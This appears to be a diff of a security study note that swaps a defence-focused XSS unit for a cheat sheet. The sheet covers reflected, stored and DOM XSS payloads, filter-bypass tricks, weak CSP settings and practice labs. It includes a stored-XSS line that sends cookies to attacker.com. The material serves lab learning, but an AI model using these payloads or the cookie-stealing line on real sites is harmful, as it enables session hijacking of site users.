@@ -1,15 +1,81 @@
-# Unit 04 — XSS, CSP, and output-context discipline
+# XSS attacks and CSP — inject, steal, bypass
 
-Labs: reflected, stored, and DOM XSS arcs; SSTI introductions when your Academy path exposes them—template injection boundaries bleed into careless dynamic evaluation.
+Three types: reflected (in URL), stored (persisted in DB), DOM (JavaScript reads attacker input).
 
-Defense lenses:
+## Basic test payloads
 
-- Context-aware escaping (HTML vs attribute vs JS vs URL—not one magic sanitizer).
+```html
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+javascript:alert(1)
+```
 
-- CSP as **layered friction**, not a single silver directive paste.
+## Reflected XSS
 
-Starter header awareness: CSP tightening tradeoffs; frame embedding controls (`X-Frame-Options`/`frame-ancestors` migration mental map); referrer policy narrowing cautiously.
+Find a search or error page that echoes input back in the HTML.
 
-## Local audit prompt
+```
+http://localhost/?search=<script>alert(1)</script>
+```
 
-Locate template `|raw` / unescaped bridging in Symfony/Twig (or equivalents). Classify misuse risk tier honestly.
+View page source — look for your payload unencoded in the HTML. If it executes: reflected XSS.
+
+## Stored XSS
+
+Submit payload to a comment, profile field, or any input that other users see.
+
+```html
+<!-- In a comment field -->
+<script>document.location='http://attacker.com/log?c='+document.cookie</script>
+```
+
+When any user views that page, their cookies are sent to `attacker.com`.
+
+## DOM XSS
+
+No server round-trip. JS reads from URL and writes to DOM unsafely.
+
+```javascript
+// Vulnerable pattern
+document.write(location.hash.slice(1))
+document.getElementById('output').innerHTML = location.search
+
+// Trigger in URL
+http://localhost/page#<img src=x onerror=alert(1)>
+```
+
+## Filter bypass techniques
+
+```html
+<!-- When <script> is filtered -->
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+
+<!-- Case variation -->
+<ScRiPt>alert(1)</ScRiPt>
+
+<!-- Encoding -->
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+```
+
+## CSP — what it blocks and how to check
+
+CSP header restricts what scripts can run:
+```
+Content-Security-Policy: default-src 'self'; script-src 'self'
+```
+
+Check a site's CSP: https://securityheaders.com
+
+Weak CSP — still exploitable:
+```
+Content-Security-Policy: script-src 'unsafe-inline'   ← inline scripts still work
+Content-Security-Policy: script-src *                  ← any domain
+```
+
+## Practice
+
+PortSwigger XSS labs (20+ labs): https://portswigger.net/web-security/cross-site-scripting
+DVWA XSS Reflected, XSS Stored modules (set security to Low → Medium → High).
